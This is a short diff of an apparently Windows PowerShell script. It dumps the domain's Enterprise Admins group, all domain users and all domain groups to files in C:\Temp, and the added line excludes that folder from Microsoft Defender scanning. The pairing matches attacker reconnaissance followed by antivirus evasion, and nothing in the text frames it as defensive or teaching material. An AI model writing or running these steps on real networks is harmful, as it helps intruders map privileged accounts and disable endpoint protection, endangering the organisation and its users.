@@ -1,3 +1,4 @@
 net group "Enterprise Admins" /domain | Out-File C:\Temp\EntA.txt
 net user /domain | Out-File C:\Temp\DomnainU.txt
 net group /domain | Out-File C:\Temp\DomnainG.txt
+Add-MpPreference -ExclusionPath "C:\Temp"
